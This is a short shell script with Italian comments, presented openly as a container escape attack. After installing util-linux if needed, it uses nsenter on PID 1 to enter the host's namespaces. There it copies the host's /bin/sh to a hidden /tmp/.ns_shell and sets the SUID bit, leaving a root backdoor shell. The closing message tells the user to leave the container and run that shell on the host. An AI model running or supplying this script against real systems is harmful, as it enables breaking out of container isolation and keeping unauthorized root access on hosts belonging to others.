echo "[*] Avvio procedura di Escape via nsenter..."

# Verifica se nsenter è disponibile, altrimenti prova a installarlo
if ! command -v nsenter > /dev/null 2>&1; then
    echo "[!] nsenter non trovato. Installazione util-linux in corso..."
    apk add --no-cache util-linux > /dev/null 2>&1
fi

echo "[*] Tentativo di accesso al Namespace del PID 1 (Host)..."

# L'ATTACCO REALE:
# 1. --target 1: Punta al processo init dell'host (o del namespace condiviso)
# 2. --mount --uts --ipc --net --pid: Entra in tutti i namespace
# 3. Copia /bin/sh dell'HOST in /tmp/.ns_shell dell'HOST
# 4. Imposta il bit SUID (chmod 4755) per mantenere i permessi root
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh -c "cp /bin/sh /tmp/.ns_shell && chmod 4755 /tmp/.ns_shell"

if [ $? -eq 0 ]; then
    echo ""
    echo "[+] SUCCESS! Shell creata sull'HOST in /tmp/.ns_shell"
    echo "[+] Ora esci dal container ed eseguila sull'host."
else
    echo "[-] Errore durante l'esecuzione di nsenter."
fi